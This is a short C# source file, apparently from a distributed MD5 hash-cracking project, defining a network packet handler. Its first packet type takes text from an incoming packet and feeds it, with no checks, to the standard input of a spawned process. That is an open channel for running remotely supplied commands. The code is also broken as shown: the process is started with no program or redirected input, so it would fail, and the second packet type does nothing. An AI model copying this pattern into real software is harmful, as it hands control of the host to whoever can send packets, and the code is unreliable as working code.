using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MD5Breaker.Networking.Packets
{
    public static class PacketHandler
    {
        static Process cmdMsg;

        public static void Handle(byte[] packet)
        {
            ushort packetType = BitConverter.ToUInt16(packet, 2);

            switch (packetType)
            {
                case 1:
                    MessagePacket msg = new MessagePacket(Encoding.UTF8.GetString(packet, 4, packet.Length - Packet.HeaderSize));
                    if(cmdMsg == null)
                    {
                        cmdMsg = new Process();
                        cmdMsg.Start();
                    }
                    cmdMsg.StandardInput.Write(msg.message);
                    break;

                case 2:

                    break;
            }
        }
    }
}
